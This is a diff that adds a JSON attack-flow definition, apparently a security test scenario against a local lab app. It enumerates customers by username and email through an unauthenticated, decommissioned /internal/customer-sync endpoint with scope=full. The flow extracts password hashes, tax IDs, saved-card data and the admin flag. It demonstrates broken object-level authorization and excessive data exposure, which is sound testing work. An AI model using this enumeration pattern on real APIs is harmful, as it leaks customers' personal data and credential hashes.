@@ -1,0 +1,110 @@
+{
+  "id": "flow_zombie_customer_sync_data_harvest",
+  "name": "Attack: Zombie Customer-Sync Export Data Harvest",
+  "description": "An anonymous actor who discovered the decommissioned /internal/customer-sync backend enumerates customer references (by username, email, and user_id) with scope=full - no auth, no ownership check - to harvest full customer records: PII, mailing addresses, saved-card metadata, credential hashes, and internal-only fields (tax_id, lifetime_value, risk notes). Demonstrates BOLA + excessive data exposure on an off-schema zombie API.",
+  "headers": {
+    "Accept": "application/json",
+    "Content-Type": "application/json"
+  },
+  "staticVars": {
+    "baseUrl": "http://localhost:8060",
+    "refAlice": "AliceSmith",
+    "refBob": "BobJohnson",
+    "refCarol": "CarolWhite",
+    "refDavidEmail": "david.brown@example.com",
+    "refEveEmail": "eve.davis@example.com",
+    "refQuinn": "QuinnBaker",
+    "refAdmin": "admin",
+    "refNotFound": "no-such-customer"
+  },
+  "steps": [
+    {
+      "id": "step_harvest_alice_full",
+      "name": "Harvest: AliceSmith (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refAlice}}", "scope": "full" },
+      "extract": {
+        "alice_pwd_hash": "body.password_hash",
+        "alice_tax_id": "body.tax_id"
+      },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_bob_full",
+      "name": "Harvest: BobJohnson (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refBob}}", "scope": "full" },
+      "extract": { "bob_cards": "body.payment_methods" },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_carol_full",
+      "name": "Harvest: CarolWhite (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refCarol}}", "scope": "full" },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_david_by_email",
+      "name": "Harvest by email: DavidBrown (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refDavidEmail}}", "scope": "full" },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_eve_by_email",
+      "name": "Harvest by email: EveDavis (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refEveEmail}}", "scope": "full" },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_quinn_full",
+      "name": "Harvest: QuinnBaker (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refQuinn}}", "scope": "full" },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_admin_full",
+      "name": "Harvest: admin superuser (scope=full)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refAdmin}}", "scope": "full" },
+      "extract": { "admin_is_admin": "body.is_admin" },
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_harvest_probe_notfound",
+      "name": "Enumeration probe: unknown reference (expect 404)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/internal/customer-sync",
+      "body": { "account_ref": "{{refNotFound}}", "scope": "full" },
+      "onFailure": "continue"
+    }
+  ],
+  "visualLayout": {
+    "step_harvest_alice_full": { "x": 50, "y": 50 },
+    "step_harvest_bob_full": { "x": 300, "y": 50 },
+    "step_harvest_carol_full": { "x": 550, "y": 50 },
+    "step_harvest_david_by_email": { "x": 800, "y": 50 },
+    "step_harvest_eve_by_email": { "x": 50, "y": 180 },
+    "step_harvest_quinn_full": { "x": 300, "y": 180 },
+    "step_harvest_admin_full": { "x": 550, "y": 180 },
+    "step_harvest_probe_notfound": { "x": 800, "y": 180 }
+  }
+}
